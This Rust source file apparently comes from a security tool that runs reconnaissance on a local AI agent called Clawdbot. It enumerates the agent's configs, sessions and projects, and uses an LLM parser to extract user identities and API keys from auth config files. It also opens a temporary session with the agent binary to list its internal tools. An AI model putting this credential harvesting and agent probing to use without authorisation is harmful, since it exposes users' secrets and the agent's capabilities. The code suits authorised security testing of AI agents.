use super::{ClawdbotAgent, ClawdbotSession};
use crate::agent_connectors::traits::{AgentRecon, AgentSession};
use crate::utils::semantic_parser::{
    self, build_metadata_extraction_prompt, parse_metadata_from_json,
    METADATA_EXTRACTION_SCHEMA,
};
use async_trait::async_trait;
use common::{
    AgentTool, ReconConfig, ReconMetadata, ReconResult, ReconTools, SessionContext,
};
use std::sync::Arc;

#[async_trait]
impl AgentRecon for ClawdbotAgent {
    async fn perform_recon(&self, is_semantic: bool) -> Option<ReconResult> {
        common::log_info!(
            "Performing recon (is_semantic={})",
            is_semantic
        );

        //
        // Get enumeration data.
        //
        let (config, sessions, project_paths) = match super::enumeration::enumerate() {
            Ok(data) => {
                let config = ReconConfig {
                    items: data.config_items,
                };
                (config, data.sessions, data.project_paths)
            }
            Err(e) => {
                common::log_warn!("Enumeration failed: {}", e);
                (ReconConfig::default(), Vec::new(), Vec::new())
            }
        };

        //
        // Discover tools.
        //
        let mut tools = ReconTools::default();

        //
        // Semantic discovery: internal tools via agent query.
        //
        if is_semantic {
            let internal_tools = self.discover_internal_tools_semantically().await;
            tools.internal_tools = internal_tools;
        }

        //
        // Extract metadata (user identities, API keys) from config files.
        //
        let metadata = if !config.items.is_empty() {
            self.extract_metadata_from_configs(&config).await
        } else {
            None
        };

        common::log_info!(
            "Recon complete - {} config items, {} sessions, {} projects, metadata={}",
            config.items.len(),
            sessions.len(),
            project_paths.len(),
            metadata.is_some()
        );

        Some(ReconResult {
            tools,
            config,
            sessions,
            project_paths,
            metadata,
        })
    }
}

impl ClawdbotAgent {
    //
    // Extract metadata (user identities, API keys) from config files using the
    // semantic parser.
    //
    async fn extract_metadata_from_configs(&self, config: &ReconConfig) -> Option<ReconMetadata> {
        if config.items.is_empty() {
            return None;
        }

        common::log_info!(
            "Extracting metadata from {} config files",
            config.items.len()
        );

        //
        // Combine config contents, prioritizing auth files.
        //
        let priority_types = ["auth_config"];
        let mut combined_configs = String::new();

        //
        // First add priority items (auth configs).
        //
        for item in &config.items {
            if priority_types.iter().any(|t| item.config_type.starts_with(t)) {
                combined_configs.push_str(&format!(
                    "=== {} ({}) ===\n{}\n\n",
                    item.path, item.config_type, item.contents
                ));
            }
        }

        //
        // Then add other items (limited to avoid token overflow).
        //
        let mut other_content = String::new();
        for item in &config.items {
            if !priority_types.iter().any(|t| item.config_type.starts_with(t)) {
                let entry = format!(
                    "=== {} ({}) ===\n{}\n\n",
                    item.path, item.config_type, item.contents
                );
                if other_content.len() + entry.len() < 50000 {
                    other_content.push_str(&entry);
                }
            }
        }
        combined_configs.push_str(&other_content);

        //
        // Get the semantic parser client.
        //
        let semantic_client = match semantic_parser::get_client() {
            Some(client) => client,
            None => {
                common::log_warn!(
                    "Semantic parser client not available for metadata extraction"
                );
                return None;
            }
        };

        //
        // Send to semantic parser for metadata extraction.
        //
        let extraction_prompt = build_metadata_extraction_prompt(&combined_configs);
        match semantic_client
            .parse(extraction_prompt, METADATA_EXTRACTION_SCHEMA.to_string())
            .await
        {
            Ok(parser_response) => {
                if parser_response.success {
                    if let Some(json) = parser_response.json {
                        if let Some(extracted) = parse_metadata_from_json(&json) {
                            let has_identities = !extracted.user_identities.is_empty();
                            let has_keys = !extracted.api_keys.is_empty();

                            if has_identities || has_keys {
                                common::log_info!(
                                    "Extracted {} user identities, {} API keys",
                                    extracted.user_identities.len(),
                                    extracted.api_keys.len()
                                );

                                return Some(ReconMetadata {
                                    user_identities: if has_identities {
                                        Some(extracted.user_identities)
                                    } else {
                                        None
                                    },
                                    api_keys: if has_keys {
                                        Some(extracted.api_keys)
                                    } else {
                                        None
                                    },
                                });
                            }
                        }
                    }
                }
                common::log_warn!(
                    "Semantic parser failed for metadata extraction: {:?}",
                    parser_response.error
                );
            }
            Err(e) => {
                common::log_warn!(
                    "Semantic parser request failed for metadata extraction: {}",
                    e
                );
            }
        }

        None
    }

    //
    // Discover internal tools by querying the agent via a temporary session.
    //
    async fn discover_internal_tools_semantically(&self) -> Vec<AgentTool> {
        let binary_path = match self.process_path.get() {
            Some(path) => path.clone(),
            None => {
                common::log_warn!("No binary path available for internal tools discovery");
                return Vec::new();
            }
        };

        //
        // Close any existing session.
        //
        {
            let mut guard = self.session.write().unwrap();
            if let Some(session) = guard.as_ref() {
                common::log_info!("Closing existing session for internal tools discovery");
                session.close();
            }
            *guard = None;
        }

        //
        // Use shared recon function to discover internal tools.
        //
        crate::agent_connectors::utils::discover_internal_tools_semantically(
            "ClawdbotAgent",
            || {
                let temp_context = SessionContext::default();
                let session = ClawdbotSession::new(Some(binary_path.clone()), &temp_context)?;
                Ok(Arc::new(session) as Arc<dyn AgentSession>)
            }
        )
        .await
    }
}
